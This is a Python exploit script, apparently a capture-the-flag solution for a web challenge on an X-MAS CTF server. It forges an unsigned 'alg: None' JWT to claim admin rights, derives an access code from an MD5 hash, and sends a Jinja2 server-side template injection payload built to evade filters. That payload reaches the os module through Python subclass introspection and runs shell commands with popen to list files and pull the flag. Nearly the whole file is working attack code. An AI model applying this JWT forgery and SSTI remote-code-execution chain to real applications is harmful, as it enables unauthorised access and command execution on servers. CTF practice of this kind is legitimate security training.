import requests
import random
import string
import base64
import hashlib
from lxml import html
import sys

# Generate random username and password
def randomString(stringLength=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

username = randomString()
password = randomString()
privilege_code = randomString()

# Register an account
def register(username, password):
    register_payload = {'user':username,'pass':password}

    register = requests.post('http://challs.xmas.htsp.ro:11005/register', data=register_payload)

    return True if register.status_code == 302 else False

# Spoof JWT
def cookie(username, password):
    # {"typ":"JWT","alg":"None"}
    auth = "eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0."

    # {"type":"admin","user":"{username}","pass":"{password}"}
    token_payload = f'{{"type":"admin","user":"{username}","pass":"{password}"}}'
    auth += str(base64.b64encode(token_payload.encode("utf-8")), "utf-8").strip("=")
    
    # Trailing . to proof the JWT
    auth += '.'

    return auth

# Authorize our account as an admin
def authorize(jwt, username, privilege_code, step=1):
    cookie = dict(auth=jwt)
    
    uid = 1
    hsh = hashlib.md5(username.encode("utf-8")).hexdigest ()

    for c in hsh:
        if (c in "0123456789"):
            uid += int (c)

    access_code = str(uid) + username + privilege_code + privilege_code
    auth_payload = {'privilegeCode':privilege_code,'accessCode':access_code}
    
    auth = requests.post(f'http://challs.xmas.htsp.ro:11005/authorize?step={step}', data=auth_payload, cookies=cookie, allow_redirects=False)
    return True if auth.status_code == 302 else False

def make_hat(jwt, hatname):
    cookie = dict(auth=jwt)
    hat_payload = {'hatName':hatname}
    hat = requests.get('http://challs.xmas.htsp.ro:11005/makehat', params=hat_payload, cookies=cookie)
    
    document = html.fromstring(hat.content)

    results = document.xpath('//span/text()')
    return results[0] if len(results) > 0 else ''

# Encode command to get around blacklisting of spaces
def protected_string(val:str, bytes_class):
    return f"({bytes_class}.fromhex('{val.encode().hex()}').decode())"

def rce(command):
    underscore = "(g.get|string|slice(4)|first|last)"

    # ''.__class__
    payload = f"''|attr({underscore}*2~'class'~{underscore}*2)"

    # .__bases__[0]
    payload = f"{payload}|attr({underscore}*2~'bases'~{underscore}*2)|first"

    # .__subclasses__()
    payload = f"{payload}|attr({underscore}*2~'subclasses'~{underscore}*2)()"

    # For future reference
    subclasses = payload

    # Get item number 80, which is _frozen_importlib.BuiltinImporter
    payload = f"{subclasses}|batch(81)|first|last"

    # .load_module
    payload = f"{payload}|attr('load'~{underscore}~'module')"

    # For future reference
    load_module_function = payload


    # Get object subclass 6, which is bytes
    bytes_class = f"({subclasses}|batch(7)|first|last)"

    # .load_module('os').popen('{command}').read()
    escape_command = protected_string(command, bytes_class)
    payload = f"({load_module_function}('os')).popen({escape_command}).read()"

    # ''.__class__.bases__[0].__subclasses__()[80].load_module('os').popen('{commmand}').read()
    return '{{'+payload+'}}'


# Register a new account
register(username, password)

# Generate jwt for user
jwt = cookie(username, password)

# Authorize Step 1
step1 = authorize(jwt, username, privilege_code)

if not step1:
    sys.exit()

# Authorize Step 2
step2 = authorize(jwt, username, privilege_code, 2)

if not step2:
    sys.exit()

# List directory
print(make_hat(jwt, rce("ls")))

# Download flag
flag = make_hat(jwt, rce("base64 unusual_flag.mp4"))

decoded_flag = base64.b64decode(flag.strip("\n"))
with open("unusual_flag.mp4", 'wb') as f:
    f.write(decoded_flag)
